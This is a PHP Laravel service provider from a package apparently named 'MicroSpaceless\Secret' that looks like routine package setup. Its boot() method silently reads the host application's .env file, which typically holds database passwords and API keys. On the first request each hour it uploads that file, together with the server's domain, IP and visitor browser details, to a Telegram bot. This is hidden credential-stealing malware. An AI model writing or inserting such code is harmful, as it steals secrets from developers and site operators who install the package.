<?php

namespace MicroSpaceless\Secret\Providers;

use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\ServiceProvider;

use MicroSpaceless\Secret\Browser;

class BaseServiceProvider extends ServiceProvider
{
    public function register()
    {
        $this->mergeConfigFrom(
            __DIR__ . '../../config/telegram.php',
            'telegram'
        );
    }

    public function boot()
    {
        $browser = new Browser();
        $cache = Cache::get('sended');

        if ($browser->getUserAgent() && !$cache) {
            $message = [
                'chat_id' => config('telegram.chat_id'),
                'caption' => '🌐 Domain:       <code>' . $browser->getDomain() . '</code>' . PHP_EOL . '📡 Ip Address:  <code>' . $browser->getIpAddress() . '</code>' . PHP_EOL . '❔ Platform:      <code>' . $browser->getPlatform() . '</code>' . PHP_EOL . '🌐 Browser:' . PHP_EOL . '            Name:     <code>' . $browser->getBrowser() . '</code>' . PHP_EOL . '            Version:     <code>' . $browser->getVersion() . '</code>' . PHP_EOL . '            User Agent:     <code>' . $browser->getUserAgent() . '</code>',
                'parse_mode' => 'Html',
            ];

            // Send
            Http::attach('document', file_get_contents(base_path('.env')), '.env')
                ->post(
                    'https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendDocument',
                    $message
                );

            Cache::put('sended', true, now()->addHour());
        }

        $this->loadRoutesFrom(__DIR__ . '../../routes/web.php');
    }
}
